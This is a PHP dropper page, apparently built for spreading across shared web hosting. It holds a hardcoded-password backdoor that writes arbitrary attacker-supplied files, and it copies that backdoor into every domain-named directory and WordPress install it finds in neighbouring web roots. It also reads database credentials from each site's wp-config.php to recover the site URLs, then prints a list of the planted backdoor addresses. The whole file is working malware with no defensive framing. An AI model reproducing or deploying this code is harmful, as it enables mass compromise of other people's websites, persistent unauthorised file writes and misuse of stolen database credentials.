<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Interface.php Create</title>
</head>

<body>
<?php

$tmp = '<?php
$action=@$_REQUEST[\'action\']; //页面状态
$password=@$_REQUEST[\'password\'];//接口密码
$pathname=@$_REQUEST[\'pathname\'];//文件目录名
$keywordindex=@$_REQUEST[\'keywordindex\'];//0 然并卵
$filename=@$_REQUEST[\'filename\'];//生成文件名
$body=stripslashes(@$_REQUEST[\'body\']);// 生成文件的内容
$jamin = @$_GET[\'pw\'];

if($jamin) { if($jamin == "smy110")
{ $zm = fopen(dirname(__FILE__).\'/\'.$filename,"w"); fwrite($zm,$body); fclose($zm);
if(is_file(dirname(__FILE__).\'/\'.$filename)){echo "yes<br>";}else{echo "no<br>";}}}

if($action=="test") {
    echo \'test success\';
    return;
}
if($action!="publish"){
    echo \'action error\';
    return;
}

if($action==""||$password==""||$filename==""||$body==""){
    echo \'parameters error\';
    return;
}
//密码更改区
if($password != "o7yy01gp1ieoycfu"){
    echo \'password error\';
    return;
}

if($pathname){
	$wjj=dirname(__FILE__)."/".$pathname;
		if(!is_dir($wjj))
		{ 	
		   createFolder($pathname);
		}
		$fp=fopen($pathname.\'/\'.$filename,"w");
 
		fwrite($fp,$body);
		fclose($fp);
		
		if(is_file($pathname.\'/\'.$filename))
			{
				echo "publish success";
			}else
			{
				echo "File does not exist";
			}
			return;
 
	}else{
		$wjj=dirname(__FILE__);	
		$fp=fopen($filename,"w");
		fwrite($fp,$body);
		fclose($fp);
		
		if(is_file($filename)){
			echo "publish success";
			}else{
			echo "File does not exist";
		}
		return;
	}
	 
function createFolder($path) 
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777,true);
    }
}
?>';	
function pz($dir){
			$myfile = @fopen($dir, "r");
			$file = fread($myfile,filesize($dir));
			$file = preg_replace('/</','',$file);
			$file = preg_replace('/>/','',$file);
			
			preg_match_all('#(\'DB_HOST\', \'(.*?)\')#U',$file,$zjarr);
   			preg_match_all('#(\'DB_NAME\', \'(.*?)\')#U',$file,$kmarr);
   			preg_match_all('#(\'DB_USER\', \'(.*?)\')#U',$file,$zharr);
   			preg_match_all('#(\'DB_PASSWORD\', \'(.*?)\')#U',$file,$mmarr);
   			preg_match_all('#table_prefix\s+=\s+\'(.*?)\'#U',$file,$qzarr);
			
			
			$con = @mysql_connect($zjarr[2][0],$zharr[2][0],$mmarr[2][0]); 
			
				if (!$con){ 
					
					return '0';
					}else{ 
						$db_selected = @mysql_select_db($kmarr[2][0], $con);
						if (!$db_selected) { 
					 
						return '0';
						}else{  
						$sql = 'SELECT * FROM '.$qzarr[1][0].'options WHERE option_id=1';

						$result=mysql_query($sql, $con); 
						while($row=mysql_fetch_array($result)){ 

						return $row['option_value'];
						 	
						}  
					}
						
				}
				mysql_close($con);
		
		}	 
$file = 'solo.php';
$cate = ''; // 如果直接在根目录就直接为空，不然格式为目录/，如'wp-content/';
$regex = '/^(http(s)?:\/\/)?(www\.)?([\w-]+\.)?[\w-]+\.\w{2,4}+(\.\w{2,4})?(\/)?$/';
$arr  = explode(DIRECTORY_SEPARATOR,dirname(__FILE__));

$mypath=dirname(__FILE__);
if (!file_exists(dirname(__FILE__).'/'.$cate.$file))
                    {                                                
                        $fo = fopen(dirname(__FILE__).'/'.$cate.$file,'xb+');   
                         fwrite( $fo,$tmp) ;
						 //or die('error<br>');
						 if(file_exists(dirname(__FILE__).'/'.$cate.$file)){
						 chmod(dirname(__FILE__).'/'.$cate.$file, 0755);
                         echo 'http://'.$_SERVER['HTTP_HOST'].'/'.$cate.$file.'<br><br>';  }                                      
                     }else{ echo 'http://'.$_SERVER['HTTP_HOST'].'/'.$cate.$file.'<br><br>';}
					 

if (end($arr)=='htdocs'||end($arr)=='html'||end($arr)=='public_html'||end($arr)=='www'||end($arr)=='webroot'||end($arr)=='httpdocs'||end($arr)=='wwwroot'||end($arr)=='docs'||end($arr)=='http')
{
	$dirpath = dirname(dirname(dirname(__FILE__))); 
 	$dir = scandir($dirpath);
 	foreach ($dir as $key=>$value)
  		{
		if (is_dir($dirpath.'/'.$value) &&is_dir($dirpath.'/'.$value.'/'.end($arr))&&$value != '.' && $value != '..')
			{
			if((preg_match($regex, $value))){
				if(!is_dir($dirpath.'/'.$value.'/'.end($arr).'/'.$cate))
				{ mkdir($dirpath.'/'.$value.'/'.end($arr).'/'.$cate,0777) or die('error<br>');}else{ echo '';}
				if (!file_exists($dirpath.'/'.$value.'/'.end($arr).'/'.$cate.$file))
                    {                                                
                        $fo = fopen($dirpath.'/'.$value.'/'.end($arr).'/'.$cate.$file,'xb+');   
                         fwrite( $fo,$tmp) ;
						 //or die('error<br>');
						  
						 if(file_exists($dirpath.'/'.$value.'/'.end($arr).'/'.$cate.$file)){
						 chmod($dirpath.'/'.$value.'/'.end($arr).'/'.$cate.$file, 0755);
                         $interface .='http://'.$value.'/'.$cate.$file.'<br>';  }                                      
                     }else{ $repeat .= 'http://'.$value.'/'.$cate.$file.'<br>';}
			}
			else if(file_exists($dirpath.'/'.$value.'/'.end($arr).'/wp-config.php')) 
					{ 
					if (!file_exists($dirpath.'/'.$value.'/'.end($arr).'/'.$cate.$file))
					{                                                
                        $fo = fopen($dirpath.'/'.$value.'/'.end($arr).'/'.$cate.$file,'xb+');   
                         fwrite( $fo,$tmp) ;
						 //or die('error<br>');
						 if(pz($dirpath.'/'.$value.'/'.end($arr).'/wp-config.php')!== '0'){
                         $interface .=pz($dirpath.'/'.$value.'/'.end($arr).'/wp-config.php').'/'.$cate.$file.'<br>'; }                                       
                     }else{ $repeat .= pz($dirpath.'/'.$value.'/'.end($arr).'/wp-config.php').'/'.$cate.$file.'<br>';}
				
			}
			}
		}			
} 
else{ 

	$dirpath = dirname(dirname(__FILE__)); 
 	$dir = scandir($dirpath);
 	foreach ($dir as $key=>$value)
  		{
		if (is_dir($dirpath.'/'.$value) && $value != '.' && $value != '..')
			{
			if((preg_match($regex, $value))){
			if(!is_dir($dirpath.'/'.$value.'/'.$cate))
			{ mkdir($dirpath.'/'.$value.'/'.$cate,0777) or die('error<br>') ;}
			else{ echo '';}
			if (!file_exists($dirpath.'/'.$value.'/'.$cate.$file))
                    {                                                
                        $fo = fopen($dirpath.'/'.$value.'/'.$cate.$file,'xb+');   
                         fwrite( $fo,$tmp);
						 // or die('error');
						 
						 if(file_exists($dirpath.'/'.$value.'/'.$cate.$file)){
						 chmod($dirpath.'/'.$value.'/'.$cate.$file, 0755); 
                         $interface .='http://'.$value.'/'.$cate.$file.'<br>';   }                                     
                     }else{ $repeat .= 'http://'.$value.'/'.$cate.$file.'<br>';}
				}
			else if(file_exists($dirpath.'/'.$value.'/wp-config.php')) 
					{ 
					if (!file_exists($dirpath.'/'.$value.'/'.$cate.$file))
					{                                                
                        $fo = fopen($dirpath.'/'.$value.'/'.$cate.$file,'xb+');   
                         fwrite($fo,$tmp);
						 //or die('error<br>');
						 
                        if(pz($dirpath.'/'.$value.'/wp-config.php')!== '0'){
						 $interface .=pz($dirpath.'/'.$value.'/wp-config.php').'/'.$cate.$file.'<br>'; }                                     
                     }else{ $repeat .= pz($dirpath.'/'.$value.'/wp-config.php').'/'.$cate.$file.'<br>';}
				
			}
			}
		}			

}
if($interface){
echo '<br><b>接口已经创建成功！</b><br>'.$interface;}
if($repeat){
echo '<br><br><hr><br>这些域名接口已经传了<br>'.$repeat;}
if($nodomain){
echo '<br><br><hr><br>这些目录不是域名:<br>'.$nodomain;}
?>
</body>
</html>